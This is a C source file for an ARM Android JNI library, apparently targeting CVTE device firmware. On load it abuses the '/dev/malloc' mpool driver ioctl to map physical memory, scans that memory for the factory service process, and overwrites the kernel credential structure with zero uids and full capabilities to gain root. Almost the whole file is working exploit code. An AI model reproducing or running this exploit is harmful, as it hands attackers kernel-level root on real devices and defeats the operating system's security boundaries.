typedef unsigned char u8;
typedef unsigned int u32;
typedef unsigned long long u64;
#define SYS_open 5
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_write 4
#define SYS_close 6
#define SYS_fork 2
#define SYS_wait4 114
#define SYS_exit 1
#define SYS_getuid 199
#define SYS_getpid 20
static long sc(long n,long a,long b,long c,long d,long e,long f){
 register long r7 __asm__("r7")=n; register long r0 __asm__("r0")=a;
 register long r1 __asm__("r1")=b; register long r2 __asm__("r2")=c;
 register long r3 __asm__("r3")=d; register long r4 __asm__("r4")=e;
 register long r5 __asm__("r5")=f;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");
 return r0;
}
static long lg=-1;
static void put(const char *s){int n=0;while(s[n])n++;if(lg>=0)sc(SYS_write,lg,(long)s,n,0,0,0);}
static void hx(u64 v){char b[19];int i;for(i=0;i<16;i++){int d=(v>>((15-i)*4))&15;b[i]=d<10?48+d:87+d;}b[16]=10;b[17]=0;put(b);}
static void dec(long v){char b[24];int i=23;b[23]=0;if(v==0){put("0");return;}int neg=0;if(v<0){neg=1;v=-v;}while(v){b[--i]=48+v%10;v/=10;}if(neg)b[--i]=45;put(b+i);}
static int mcmp(const unsigned char *a,const unsigned char *b,int n){int i;for(i=0;i<n;i++)if(a[i]!=b[i])return 1;return 0;}
struct info {u64 addr;u64 size;u64 interval;u8 miusel;u8 pad[7];};
#define MPOOL_IOC_SET 0x80204d04u
#define PAGE_OFFSET 0xffffff8000000000ULL
static unsigned long map_phys(long fd,u64 phys,u64 size){
 if(phys<0x20000000ULL)return 0;
 struct info in; in.addr=phys-0x20000000ULL;in.size=size;in.interval=0;in.miusel=0;in.pad[0]=0;
 if(sc(SYS_ioctl,fd,MPOOL_IOC_SET,(long)&in,0,0,0))return 0;
 long p=sc(SYS_mmap2,0,size,3,1,fd,0);
 if((unsigned long)p>=0xfffff000UL)return 0;
 return (unsigned long)p;
}
static int try_cred(long fd,u64 cp){
 unsigned long p=map_phys(fd,cp,0x1000);
 put("try ");hx(cp);put(" map ");hx(p);put("\n");
 if(!p)return 0;
 unsigned char *b=(unsigned char*)p; int i,j; int found=0;
 for(i=0;i<=0x100;i+=4){
  for(j=0;j<8;j++) if(*(u32*)(b+i+j*4)!=1000) break;
  if(j==8){found=1;break;}
 }
 if(found){
  put("PAT ");hx(cp+i);put(" usage ");hx(*(u32*)(b+i-4));put("\n");
  for(j=0;j<8;j++) *(u32*)(b+i+j*4)=0;
  *(u32*)(b+i+32)=0;
  for(j=36;j<76;j+=4) *(u32*)(b+i+j)=0xffffffffu;
  put("WROTE uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 }
 sc(SYS_munmap,p,0x1000,0,0,0,0);
 return found;
}
static void child_scan(long fd,u64 base,u64 size){
 unsigned long mp=map_phys(fd,base,size);
 put("child base ");hx(base);put(" map ");hx(mp);put("\n");
 if(!mp)sc(SYS_exit,2,0,0,0,0,0);
 unsigned char *b=(unsigned char*)mp; u64 i;
 const char *pat1="factory.service"; const char *pat2="com.cvte.factor";
 for(i=8;i+15<size;i++){
  if(mcmp(b+i,(const unsigned char*)pat1,15) && mcmp(b+i,(const unsigned char*)pat2,15))continue;
  u64 v=*(u64*)(b+i-8);
  put("HIT ");hx(base+i);put(" cp ");hx(v);put("\n");
  if(v>=PAGE_OFFSET && v<PAGE_OFFSET+0x92000000ULL){
   u64 cp=(v-PAGE_OFFSET)&~0xfffULL;
   if(cp>=0x20000000ULL && cp<0x92000000ULL){
    if(try_cred(fd,cp)){
     put("SUCCESS uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
     sc(SYS_exit,42,0,0,0,0,0);
    }
   }
  }
 }
 sc(SYS_munmap,mp,size,0,0,0,0);
 sc(SYS_exit,1,0,0,0,0,0);
}
__attribute__((visibility("default"))) int JNI_OnLoad(void *a,void *b){
 lg=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/mpoolroot.log",0x241,0644,0,0,0);
 put("start uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put(" pid=");dec(sc(SYS_getpid,0,0,0,0,0,0));put("\n");
 long fd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0);
 put("fd=");dec(fd);put("\n");
 if(fd<0)return 0x10006;
 u64 base;
 for(base=0x20000000ULL;base<0x40000000ULL;base+=0x2000000ULL){
  put("chunk ");hx(base);put("\n");
  long pid=sc(SYS_fork,0,0,0,0,0,0);
  if(pid==0)child_scan(fd,base,0x2000000ULL);
  int st=0;sc(SYS_wait4,pid,(long)&st,0,0,0,0);
  put("status=");dec(st);put(" uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
  if(sc(SYS_getuid,0,0,0,0,0,0)==0){put("ROOT\n");break;}
 }
 put("end uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 return 0x10006;
}
